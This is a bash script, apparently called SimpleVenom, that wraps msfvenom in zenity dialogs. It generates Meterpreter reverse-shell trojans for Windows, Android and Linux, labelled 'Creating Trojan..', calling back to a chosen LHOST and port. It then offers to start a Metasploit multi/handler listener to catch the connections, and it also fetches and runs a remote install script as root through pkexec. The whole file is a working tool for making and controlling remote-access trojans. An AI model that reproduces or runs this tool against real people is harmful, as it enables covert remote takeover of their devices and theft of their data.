#!/bin/bash

###############################
# a script by ByCh4n&lazypwny #
###############################

## variables

#Colors
white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
purple="\033[0;35m"
cyan="\033[0;36m"
cafe="\033[0;33m"
fiuscha="\033[0;35m"
blue="\033[1;34m"
tp="\e[0m"

setdir="$PWD"
setversion="1.0"
owner="ByCh4n&LazyPwny"

today=$(date | awk '{print $1,$2,$3,$4"-"$5}')
thistime=$(date | awk '{$5}')

setlhost=$(hostname -I | awk '{print $1}')
setlport="666"
setname="venom"

dc="https://discord.io/ByCh4n"

## ARGV
if [[ $1 =~ ^(-v|-V|--version|--VERSION|version) ]] ; then
    echo "${setversion} ${owner}"
    exit 0
elif [[ $1 =~ ^(-i|-I|--info|--INFO) ]] ; then
    zenity --info --width=500 --title="SimpleVenom ${setversion} / ${owner}" --text="YouTube: https://www.youtube.com/channel/UCzOK1_NybPfqNb1V4Hjj-iw\nDiscord: ${dc}\nByCh4n: https://github.com/ByCh4n\nLazyPwny: https://github.com/lazypwny751"
    exit 0
fi
## F(x)

function rastgele_renk {

    echo -ne "\e[3$(( $RANDOM * 6 / 32767 + 1 ))m$rengarenk"
    rengarenk=""
}

function checktool {

    if ! [ -f "${setdir}/requirementtoinstall.sh" ] ; then
        netcheckSI
        curl -o "${setdir}/requirementtoinstall.sh" "https://raw.githubusercontent.com/ByCh4n/SimpleVenom/main/requirementtoinstall.sh"
        if ! [ -f "${setdir}/requirementtoinstall.sh" ] ; then
            echo -e "Ops Sorry We Can't Found ${red}requirementtoinstall.sh${tp} Pls Reinstall This Tool!"
            exit 1
        fi
    fi

    if [[ $(command -v ${1}) != "" ]] ; then
            echo "${1} Found.."
    else
        netcheckSI
        echo "${1} Can't Found Will Be Install.."
        pkexec bash "${setdir}/requirementtoinstall.sh" "${1}"
        if [[ $(command -v ${1}) != "" ]] ; then
            echo "${1} Is Istalled And Ready To Use.."
        else
            echo "some unknown errors occurred, if the problem persists, you can contact us at our discord address.: $dc"
            exit 1
        fi
    fi

    if [[ ${exit2tool} = 1 ]] ; then
        exit 1
    fi
}

center() {
    termwidth="$(tput cols)"
    padding="$(printf '%0.1s' ={1..500})"
    printf '%*.*s %s %*.*s\n' 0 "$(((termwidth-2-${#1})/2))" "$padding" "$1" 0 "$(((termwidth-1-${#1})/2))" "$padding"
    echo -e "$tp"
}

banner () {
    echo "███████╗██╗███╗   ███╗██████╗ ██╗     ███████╗ 
██╔════╝██║████╗ ████║██╔══██╗██║     ██╔════╝" ;rastgele_renk
    echo "███████╗██║██╔████╔██║██████╔╝██║     █████╗   
╚════██║██║██║╚██╔╝██║██╔═══╝ ██║     ██╔══╝" ;rastgele_renk
    echo "███████║██║██║ ╚═╝ ██║██║     ███████╗███████╗ 
╚══════╝╚═╝╚═╝     ╚═╝╚═╝     ╚══════╝╚══════╝" ;rastgele_renk
                                               
    echo "██╗   ██╗███████╗███╗   ██╗ ██████╗ ███╗   ███╗
██║   ██║██╔════╝████╗  ██║██╔═══██╗████╗ ████║";rastgele_renk
    echo "██║   ██║█████╗  ██╔██╗ ██║██║   ██║██╔████╔██║
╚██╗ ██╔╝██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║";rastgele_renk
    echo -e " ╚████╔╝ ███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║
  ╚═══╝  ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝$tp\n\t\t\t\t${red}--${owner}$tp"
}

spin1 () {
    count=0
    total=$1
    pstr="[=======================================================================]"

    while [ $count -lt $total ]; do
        sleep 0.5 # this is work
        count=$(( $count + 1 ))
        pd=$(( $count * 73 / $total ))
        printf "\r%3d.%1d%% %.${pd}s" $(( $count * 100 / $total )) $(( ($count * 1000 / $total) % 10 )) $pstr
    done
        echo ""
}

function netcheckGUI {
    wget -q --spider http://google.com

    if [ $? -eq 0 ]; then
        echo "Online [OK]"
    else
        zenity --warning --width=450 --height=50 \
        --text="This Script Requires Internet Connection to Work!"
        exit 1
    fi
}

function netcheckSI {
        wget -q --spider http://google.com

    if [ $? -eq 0 ]; then
        echo "OnLine "
    else
        echo "OffLine [-]"
        exit 1
    fi
}

function localip {
    lhost=$(zenity --entry --title "SimpleVenom $setversion / $owner" --text "Entire Your LocalIP 'Default LocalIP: $setlhost'\n(If You Don't Know Leave Blank)")
        
    if [ "$?" != 0 ] ; then
        echo "thanks for use simplevenom (^-^)"
        exit 0
    fi

    if [[ $lhost = "" ]] ; then
        lhost="$setlhost"
        echo -e "Set Lhost=> $lhost"
    elif [[  $lhost != "" ]] ; then
        re='^[0-9]+([.][0-9]+)+([.][0-9]+)+([.][0-9]+)?$'
        if ! [[ $lhost =~ $re ]] ; then
            zenity --error --width=100 --text "There Is Not IP!"
            lhost="$setlhost"
            echo -e "Set LocalIP=> $lhost"
        else
            echo -e "Set LocalIP=> $lhost"
        fi  
    fi
}

function localport {
    lport=$(zenity --entry --title "SimpleVenom $setversion / $owner" --text "Entire Your LocalPort 'Default LPORT: $setlport' \n(If You Don't Know Leave Blank)")

    if [ "$?" != 0 ] ; then
        echo "thanks for use simplevenom (^-^)"
        exit 0
    fi

    if [[ $lport = "" ]] ; then
        lport="$setlport"
        echo -e "Set Lport=> $lport"
    elif [[ $lport != "" ]] ; then
        re='^[0-9]+$'
        if ! [[ $lport =~ $re ]] ; then
            zenity --error --width=150 --text "There Is Not LPORT!"
            lport="$setlport"
            echo -e "Set LocalPort=> $lport\n"
        elif [[ $lport =~ $re ]] ; then
            if [ $lport -gt 65535 ] ; then
                zenity --error --width=150 --text "There Is Not LPORT!"
                lport="$setlport"
                echo -e "Set LocalPort=> $lport"
            else
                echo -e "Set LocalPort=> $lport"
            fi
        fi
    fi

}

function nameoFile {
    
    ne="${1}"
    
    namefile=$(zenity --entry --width=300 --title "SimpleVenom $setversion / $owner" --text "Entire Name Of The File 'Default File Name: $setname'\n(If You Don't Know Leave Blank)")

    if [[ "$?" != 0 ]] ; then
        echo "thanks for use simplevenom (^-^)"
        exit 0
    fi

    if [[ $namefile != "" ]] ; then
        namefile="${namefile}.${ne}"
        echo -e "Set File Name=> $namefile"
    elif [[ $namefile = "" ]] ; then
        namefile="${setname}.${ne}"
        echo -e "Set File Name=> $namefile"
    fi    
}

function quest {
    if [[ $1 = "" ]] ; then
        quest="Are You Sure?"
    elif [[ $1 != "" ]] ; then
        quest="${1}"
    fi
    zenity --question --width 200 --text="${quest}" 
    if [[ "$?" != 0 ]] ; then
        zenity --error --width 150 --text="Aborted By User."
        echo "thanks for use simplevenom (^-^)"
        exit 0
    fi
}

function multihandlermonitor {
    zenity --question --width 400 --text="Would you like to put the created exploit into listening mode?"
    if [[ "$?" = 0 ]] ; then
        echo "Started Msfconsole>Multi/Handler>$payload"
        xterm -T "Msfconsole Multi/Handler Monitoring Screen" -fa monaco -fs 10 -bg black -e "pkexec msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $payload; exploit'"
        echo "thanks for use simplevenom (^-^)"
        exit 0
    elif [[ "$?" != 0 ]] ; then
        zenity --info --width 400 --text="Our Discord: ${dc}\nSee Yea.. (￢‿￢)"
        echo "thanks for use simplevenom (^-^)"
        exit 0
    fi
}

trap ctrl_c INT
ctrl_c() {
    echo "Thx For Use SimpleVenom"
    randend=$(( RANDOM % 3 ))
    if [[ $randend = "1" ]] ; then
        echo "> Hosta la vista baby"
    elif [[ $randend = "2" ]] ; then
        echo "> Aurevoir Mon Frere (^-^)"
    elif [[ $randend = "3" ]] ; then
        echo "> Wir sehen uns"
    else
        echo "> We Are Waiting For You: $dc"
    fi
exit 0
}

checktool zenity
checktool msfvenom
checktool xterm

### main

printf '\033[8;25;90t'
banner
center "Log Screen V1 - $today" #payload=$(zenity --width=360 --height=320 --list --title "SimpleVenom $setversion / $owner" --text "Choise a Platform..." --column Platforms "windows/meterpreter/reverse_tcp" "windows/meterpreter/reverse_http" "windows/meterpreter/reverse_tcp_dns")
echo -e "Set Lhost=> $setlhost\nSet Lport=> $setlport\nSet File Name=> $setname\n"
while :; do

    choiseplatform=$(zenity --width=360 --height=320 --list --title "SimpleVenom $setversion / $owner" --text "Choise a Platform..." --column Platforms "Windows" "Android" "Linux")
    center "Set Platform: ${choiseplatform}"
    if [ "$choiseplatform" = "Windows" ]; then
        
        payload=$(zenity --width=360 --height=220 --list --title "SimpleVenom $setversion / $owner" --text "Choise a Payload:" --radiolist --column "Choose" --column "Option" TRUE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_tcp_dns")

        if [ "$payload" = "" ] ; then
            echo "thanks for use simplevenom (^-^)"
            exit 0
        fi

        echo -e "Set Payload=> $payload"

        localip
        localport
        nameoFile "exe"

        if [[ -f ${setdir}/${namefile} ]] ; then
            quest "Overwrite ${namefile} file exists in this directory?"
            (
            echo "10" ; sleep 0.3
            echo "# Searching For Payload: ${payload}" ; sleep 0.3 # sadece boş ama hoş :D
            echo "20" ; sleep 0.3
            echo "# Preparing To Create File.." ; sleep 0.3 # sadece boş ama hoş :D
            echo "50" ; sleep 0.3
            echo "# Creating File To ${setdir}/${namefile}" ; msfvenom -p "${payload}" LHOST="${lhost}" LPORT="${lport}" -f exe -o "${setdir}/${namefile}"
            echo "75" ; sleep 0.3
            echo "# Complated Job." ; sleep 0.3 # sadece boş ama hoş :D
            echo "100" ; sleep 0.3
            ) |
            zenity --progress \
            --width 400 \
            --title="SimpleVenom $setversion / $owner" \
            --text="Creating Trojan.." \
            --percentage=0

            if [ "$?" != 0 ] ; then
                    zenity --error \
                    --text="Aborted By User."
                    echo "Aborted By User Removing File: ${setdir}/${namefile}"
                    rm "${setdir}/${namefile}"
                    exit 0
            fi
        #####
        else
        #####
            (
            echo "10" ; sleep 0.3
            echo "# Searching For Payload: ${payload}" ; sleep 0.3 # sadece boş ama hoş :D
            echo "20" ; sleep 0.3
            echo "# Preparing To Create File.." ; sleep 0.3 # sadece boş ama hoş :D
            echo "50" ; sleep 0.3
            echo "# Creating File To ${setdir}/${namefile}" ; msfvenom -p "${payload}" LHOST="${lhost}" LPORT="${lport}" -f exe -o "${setdir}/${namefile}"
            echo "75" ; sleep 0.3
            echo "# Complated Job." ; sleep 0.3 # sadece boş ama hoş :D
            echo "100" ; sleep 0.3
            ) |
            zenity --progress \
            --width 400 \
            --title="SimpleVenom $setversion / $owner" \
            --text="Creating Trojan.." \
            --percentage=0

            if [ "$?" != 0 ] ; then
                    zenity --error \
                    --text="Aborted By User."
                    echo "Aborted By User Removing File: ${setdir}/${namefile}"
                    rm "${setdir}/${namefile}"
                    exit 0
            fi
        fi

        if [[ -f ${setdir}/${namefile} ]] ; then
            if [[ $(du -k "${setdir}/${namefile}" | cut -f1) = "0" ]] ; then
                echo "Can not Creating File!"
                zenity --error --width 220 --text "Cann ot Creating The File!"
                exit 1
            else
                zenity --info --width 300 --title "${setdir}/${namefile}" --text "LHOST: $lhost\nLPORT:$lport\nFILENAME:$namefile"
                multihandlermonitor
                exit 0
            fi
        fi

    elif [ "$choiseplatform" = "Android" ]; then
        echo -e "Set Platform=> Android"

        payload=$(zenity --width=360 --height=220 --list --title "SimpleVenom $setversion / $owner" --text "Choise a Payload:" --radiolist --column "Choose" --column "Option" TRUE "android/meterpreter/reverse_tcp" FALSE "android/meterpreter/reverse_https" FALSE "android/meterpreter/reverse_http")

        if [ "$payload" = "" ] ; then
            echo "thanks for use simplevenom (^-^)"
            exit 0
        fi

        echo -e "Set Payload=> $payload"

        localip
        localport
        nameoFile "apk"

        if [[ -f ${setdir}/${namefile} ]] ; then
            quest "Overwrite ${namefile} file exists in this directory?"
            (
            echo "10" ; sleep 0.3
            echo "# Searching For Payload: ${payload}" ; sleep 0.3 # sadece boş ama hoş :D
            echo "20" ; sleep 0.3
            echo "# Preparing To Create File.." ; sleep 0.3 # sadece boş ama hoş :D
            echo "50" ; sleep 0.3
            echo "# Creating File To ${setdir}/${namefile}" ; msfvenom -p "${payload}" LHOST="${lhost}" LPORT="${lport}" R -o "${setdir}/${namefile}"
            echo "75" ; sleep 0.3
            echo "# Complated Job." ; sleep 0.3 # sadece boş ama hoş :D
            echo "100" ; sleep 0.3
            ) |
            zenity --progress \
            --width 400 \
            --title="SimpleVenom $setversion / $owner" \
            --text="Creating Trojan.." \
            --percentage=0

            if [ "$?" != 0 ] ; then
                    zenity --error \
                    --text="Aborted By User."
                    echo "Aborted By User Removing File: ${setdir}/${namefile}"
                    rm "${setdir}/${namefile}"
                    exit 0
            fi
        #####
        else
        #####
            (
            echo "10" ; sleep 0.3
            echo "# Searching For Payload: ${payload}" ; sleep 0.3 # sadece boş ama hoş :D
            echo "20" ; sleep 0.3
            echo "# Preparing To Create File.." ; sleep 0.3 # sadece boş ama hoş :D
            echo "50" ; sleep 0.3
            echo "# Creating File To ${setdir}/${namefile}" ; msfvenom -p "${payload}" LHOST="${lhost}" LPORT="${lport}" R -o "${setdir}/${namefile}"
            echo "75" ; sleep 0.3
            echo "# Complated Job." ; sleep 0.3 # sadece boş ama hoş :D
            echo "100" ; sleep 0.3
            ) |
            zenity --progress \
            --width 400 \
            --title="SimpleVenom $setversion / $owner" \
            --text="Creating Trojan.." \
            --percentage=0

            if [ "$?" != 0 ] ; then
                    zenity --error \
                    --text="Aborted By User."
                    echo "Aborted By User Removing File: ${setdir}/${namefile}"
                    rm "${setdir}/${namefile}"
                    exit 0
            fi
        fi

        if [[ -f ${setdir}/${namefile} ]] ; then
            if [[ $(du -k "${setdir}/${namefile}" | cut -f1) = "0" ]] ; then
                echo "Can not Creating File!"
                zenity --error --width 220 --text "Cann ot Creating The File!"
                exit 1
            else
                zenity --info --width 300 --title "${setdir}/${namefile}" --text "LHOST: $lhost\nLPORT:$lport\nFILENAME:$namefile"
                multihandlermonitor
                exit 0
            fi
        fi

    elif [ "$choiseplatform" = "Linux" ]; then
        echo -e "Set Platform=> Linux"

        payload=$(zenity --width=400 --height=250 --list --title "SimpleVenom $setversion / $owner" --text "Choise a Payload:" --radiolist --column "Choose" --column "Option" TRUE "linux/x86/meterpreter_reverse_tcp" FALSE "linux/x86/meterpreter_reverse_http" FALSE "linux/x86/meterpreter_reverse_https" FALSE "linux/x86/meterpreter/reverse_ipv6_tcp")

        if [ "$payload" = "" ] ; then
            echo "thanks for use simplevenom (^-^)"
            exit 0
        fi

        echo -e "Set Payload=> $payload"

        localip
        localport
        nameoFile "bin"

        if [[ -f ${setdir}/${namefile} ]] ; then
            quest "Overwrite ${namefile} file exists in this directory?"
            (
            echo "10" ; sleep 0.3
            echo "# Searching For Payload: ${payload}" ; sleep 0.3 # sadece boş ama hoş :D
            echo "20" ; sleep 0.3
            echo "# Preparing To Create File.." ; sleep 0.3 # sadece boş ama hoş :D
            echo "50" ; sleep 0.3
            echo "# Creating File To ${setdir}/${namefile}" ; msfvenom -p "${payload}" LHOST="${lhost}" LPORT="${lport}" -f elf -o "${setdir}/${namefile}"
            echo "75" ; sleep 0.3
            echo "# Complated Job." ; sleep 0.3 # sadece boş ama hoş :D
            echo "100" ; sleep 0.3
            ) |
            zenity --progress \
            --width 400 \
            --title="SimpleVenom $setversion / $owner" \
            --text="Creating Trojan.." \
            --percentage=0

            if [ "$?" != 0 ] ; then
                    zenity --error \
                    --text="Aborted By User."
                    echo "Aborted By User Removing File: ${setdir}/${namefile}"
                    rm "${setdir}/${namefile}"
                    exit 0
            fi
        #####
        else
        #####
            (
            echo "10" ; sleep 0.3
            echo "# Searching For Payload: ${payload}" ; sleep 0.3 # sadece boş ama hoş :D
            echo "20" ; sleep 0.3
            echo "# Preparing To Create File.." ; sleep 0.3 # sadece boş ama hoş :D
            echo "50" ; sleep 0.3
            echo "# Creating File To ${setdir}/${namefile}" ; msfvenom -p "${payload}" LHOST="${lhost}" LPORT="${lport}" -f elf -o "${setdir}/${namefile}"
            echo "75" ; sleep 0.3
            echo "# Complated Job." ; sleep 0.3 # sadece boş ama hoş :D
            echo "100" ; sleep 0.3
            ) |
            zenity --progress \
            --width 400 \
            --title="SimpleVenom $setversion / $owner" \
            --text="Creating Trojan.." \
            --percentage=0

            if [ "$?" != 0 ] ; then
                    zenity --error \
                    --text="Aborted By User."
                    echo "Aborted By User Removing File: ${setdir}/${namefile}"
                    rm "${setdir}/${namefile}"
                    exit 0
            fi
        fi

        if [[ -f ${setdir}/${namefile} ]] ; then
            if [[ $(du -k "${setdir}/${namefile}" | cut -f1) = "0" ]] ; then
                echo "Can not Creating File!"
                zenity --error --width 220 --text "Cann ot Creating The File!"
                exit 1
            else
                zenity --info --width 300 --title "${setdir}/${namefile}" --text "LHOST: $lhost\nLPORT:$lport\nFILENAME:$namefile"
                multihandlermonitor
                exit 0
            fi
        fi

    else
        echo "thanks for use simplevenom (^-^)"
        exit 0
    fi
done
